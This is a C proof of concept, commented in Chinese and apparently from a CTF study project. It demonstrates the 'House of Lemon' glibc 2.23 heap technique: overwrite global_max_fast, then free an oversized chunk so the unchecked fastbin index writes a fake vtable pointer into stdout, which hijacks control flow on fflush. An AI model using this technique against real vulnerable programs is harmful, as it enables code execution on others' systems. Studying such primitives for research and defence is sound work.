/*
 * House of Lemon：glibc 2.23 / Ubuntu 16.04 首发 libc 的最小可执行 PoC。
 *
 * 目标不是复刻原题菜单，而是单独证明 House of Lemon 最关键的两步：
 *   1. 已有一次 libc 任意写后，把 global_max_fast 扩大；
 *   2. free 一个 0x17c0 chunk，使 fastbin_index 越过 fastbinsY，恰好把
 *      chunk 地址写到 _IO_2_1_stdout_.vtable；随后 fflush(stdout) 跳进
 *      堆上的伪 vtable。
 *
 * 运行环境必须是本项目准备的 2.23-0ubuntu3_amd64。global_max_fast 是
 * glibc hidden 符号，PoC 用它相对 _IO_2_1_stdout_ 的该构建固定偏移定位。
 * 换附件 libc 时请先按 README 的公式重新计算偏移，不能照抄。
 */

#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

/* 以下分析对应 Ubuntu 打包的 glibc 2.23-0ubuntu3：
 *   _IO_2_1_stdout_ = libc + 0x3c4620
 *   main_arena      = libc + 0x3c3b20
 *   global_max_fast = libc + 0x3c5848
 */
#define MAIN_ARENA_FROM_STDOUT      (-0xb00L)
#define GLOBAL_MAX_FAST_FROM_STDOUT  0x1228L

/* malloc(0x17b0) 在 x86-64 上得到 size=0x17c0 的 chunk。 */
#define REQUEST_SIZE 0x17b0
#define CHUNK_SIZE   0x17c0

static void win(void)
{
    static const char message[] =
        "[+] House of Lemon: stdout 的虚表调用已经劫持到堆上。\n";

    /* stdout 已被破坏，不能再用 printf/puts；直接使用 write。 */
    (void)write(STDOUT_FILENO, message, sizeof(message) - 1);
    _exit(0);
}

int main(void)
{
    unsigned char *stdout_object;
    unsigned char *main_arena;
    size_t *global_max_fast;
    void **user;
    void **fake_vtable;
    void **stdout_vtable_slot;
    size_t index;
    size_t expected_size;

    /* dlsym 返回 FILE 对象本身，不是 stdout 这个 FILE * 全局变量的地址。 */
    stdout_object = dlsym(RTLD_DEFAULT, "_IO_2_1_stdout_");
    if (stdout_object == NULL)
        return 1;

    main_arena = stdout_object + MAIN_ARENA_FROM_STDOUT;
    global_max_fast = (size_t *)(stdout_object +
                                GLOBAL_MAX_FAST_FROM_STDOUT);

    /* _IO_FILE_plus 在 glibc 2.23 x86-64 中的 vtable 位于对象 +0xd8。 */
    stdout_vtable_slot = (void **)(stdout_object + 0xd8);

    /* 源码关系：fastbinsY 起于 main_arena+8，每项 8 字节；
     * fastbin 索引计算公式为 fastbin_index(size) = (size >> 4) - 2。
     */
    index = ((uintptr_t)stdout_vtable_slot -
             ((uintptr_t)main_arena + 8)) / sizeof(void *);
    expected_size = (index + 2) << 4;
    if (expected_size != CHUNK_SIZE)
        return 2;

    /* 让 stdout 进入稳定的已初始化状态；之后不再调用 stdio 输出。 */
    if (setvbuf(stdout, NULL, _IONBF, 0) != 0)
        return 3;

    user = malloc(REQUEST_SIZE);
    if (user == NULL)
        return 4;

    /* fake_vtable 指向 chunk header，而 user 指向 header+0x10。
     * free 会覆盖 user[0]（即 fake_vtable[2]），所以从 user[1] 开始填。
     * fflush 使用的 __sync 槽也会命中 win；多填一些槽便于单步观察。
     */
    fake_vtable = user - 2;
    for (size_t i = 1; i < 32; ++i)
        user[i] = (void *)win;

    /* 原题通过 unsafe unlink 获得这次写。这里把“已有 libc 任意写”作为
     * 前置原语直接表达，从而把 PoC 聚焦到 Lemon 独有的 fastbin OOB。
     */
    *global_max_fast = 0x2000;

    /* 2.23 的 _int_free 先比较 size <= global_max_fast，再计算不带边界
     * 检查的 fastbin_index。于是 *stdout_vtable_slot 被写成 chunk header。
     */
    free(user);

    if (*stdout_vtable_slot != fake_vtable)
        _exit(5);

    /* glibc 2.23 尚无 2.24 引入的 IO_validate_vtable，因而接受堆虚表。 */
    (void)fflush(stdout);
    _exit(6);
}
